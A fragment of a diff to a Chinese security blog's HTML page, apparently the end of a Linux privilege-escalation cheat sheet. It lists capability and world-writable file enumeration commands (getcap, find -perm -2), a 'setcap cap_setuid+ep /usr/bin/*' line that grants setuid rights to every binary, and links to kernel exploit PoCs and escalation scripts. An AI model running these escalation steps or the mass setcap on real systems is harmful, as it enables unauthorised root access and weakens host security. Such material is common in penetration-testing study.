+<h3 id="2-可用文件查找"><a href="#2-可用文件查找" class="headerlink" title="2. 可用文件查找"></a>2. 可用文件查找</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getcap -r /usr/bin</span><br><span class="line"></span><br><span class="line">setcap cap_net_raw+p /bin/*</span><br><span class="line"></span><br><span class="line">setcap cap_setuid+ep /usr/bin/*</span><br><span class="line"></span><br><span class="line">grep -v &apos;^#\|none\|^$&apos; /etc/security/capability.conf 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><strong>可写权限文件查找</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -writable ! -user `whoami` -type f ! -path &quot;/proc/*&quot; ! -path &quot;/sys/*&quot; -exec ls -al &#123;&#125; \; 2&gt;/dev/null</span><br><span class="line">find / -perm -2 -type f 2&gt;/dev/null</span><br><span class="line">find / ! -path &quot;*/proc/*&quot; -perm -2 -type f -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<h2 id="0xFF-参考资源"><a href="#0xFF-参考资源" class="headerlink" title="0xFF 参考资源"></a>0xFF 参考资源</h2><p><strong>GTFOBins</strong></p>
+<ul>
+<li><a href="https://gtfobins.github.io/" target="_blank" rel="noopener">https://gtfobins.github.io/</a></li>
+</ul>
+<p><strong>提权漏洞</strong></p>
+<ul>
+<li><a href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs" target="_blank" rel="noopener">https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs</a></li>
+<li><a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/linux-kernel-exploits</a></li>
+<li><a href="https://github.com/xairy/kernel-exploits" target="_blank" rel="noopener">https://github.com/xairy/kernel-exploits</a></li>
+</ul>
+<p><strong>提权脚本</strong></p>
+<ul>
+<li><a href="https://github.com/jondonas/linux-exploit-suggester-2" target="_blank" rel="noopener">https://github.com/jondonas/linux-exploit-suggester-2</a></li>
+<li><a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" target="_blank" rel="noopener">https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS</a></li>
+<li><a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener">https://github.com/rebootuser/LinEnum</a></li>
+<li><a href="https://github.com/redcode-labs/Bashark" target="_blank" rel="noopener">https://github.com/redcode-labs/Bashark</a></li>
+<li><a href="https://github.com/mzet-/linux-exploit-suggester" target="_blank" rel="noopener">https://github.com/mzet-/linux-exploit-suggester</a></li>
+<li><a href="https://github.com/sleventyeleven/linuxprivchecker" target="_blank" rel="noopener">https://github.com/sleventyeleven/linuxprivchecker</a></li>
+<li><a href="https://github.com/diego-treitos/linux-smart-enumeration" target="_blank" rel="noopener">https://github.com/diego-treitos/linux-smart-enumeration</a></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings</a></li>
 </ul>
 
       
@@ -446,13 +697,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/Metsploit/" rel="tag"><i class="fa fa-tag"></i>
+            <a href="/tags/Privilege-Escalation/" rel="tag"><i class="fa fa-tag"></i>
 
- Metsploit</a>
-          
-            <a href="/tags/Tookit/" rel="tag"><i class="fa fa-tag"></i>
-
- Tookit</a>
+ Privilege Escalation</a>
           
         </div>
       
@@ -465,8 +712,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/posts/30803/" rel="next" title="Sqlmap备忘单">
-                <i class="fa fa-chevron-left"></i> Sqlmap备忘单
+              <a href="/posts/33899/" rel="next" title="红队武器工具库">
+                <i class="fa fa-chevron-left"></i> 红队武器工具库
               </a>
             
           </div>
@@ -475,8 +722,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/posts/10803/" rel="prev" title="内网存活主机发现姿势">
-                内网存活主机发现姿势 <i class="fa fa-chevron-right"></i>
+              <a href="/posts/10124/" rel="prev" title="Linux应急响应进阶篇">
+                Linux应急响应进阶篇 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -627,7 +874,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-基本介绍"><span class="nav-text">0x01 基本介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-架构图"><span class="nav-text">1. 架构图</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-目录结构"><span class="nav-text">2. 目录结构</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-常用命令"><span class="nav-text">0x02 常用命令</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-基础命令"><span class="nav-text">1. 基础命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Meterpreter命令"><span class="nav-text">2. Meterpreter命令</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0xFF-参考资源"><span class="nav-text">0xFF 参考资源</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-SUID提权"><span class="nav-text">0x01 SUID提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-简介"><span class="nav-text">1. 简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-漏洞利用"><span class="nav-text">2. 漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-SUDO提权"><span class="nav-text">0x02 SUDO提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-简介-1"><span class="nav-text">1. 简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-漏洞利用-1"><span class="nav-text">2. 漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-计划任务提权"><span class="nav-text">0x03 计划任务提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-简介-2"><span class="nav-text">1. 简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-漏洞利用-2"><span class="nav-text">2. 漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-密码复用提权"><span class="nav-text">0x04 密码复用提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-简介-3"><span class="nav-text">1. 简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-漏洞利用-3"><span class="nav-text">2. 漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-NFS提权"><span class="nav-text">0x05 NFS提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-简介-4"><span class="nav-text">1. 简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-漏洞利用-4"><span class="nav-text">2. 漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-Capabilities利用"><span class="nav-text">0x06 Capabilities利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-简介-5"><span class="nav-text">1. 简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-可用文件查找"><span class="nav-text">2. 可用文件查找</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0xFF-参考资源"><span class="nav-text">0xFF 参考资源</span></a></li></ol></div>
             
 
           </div>
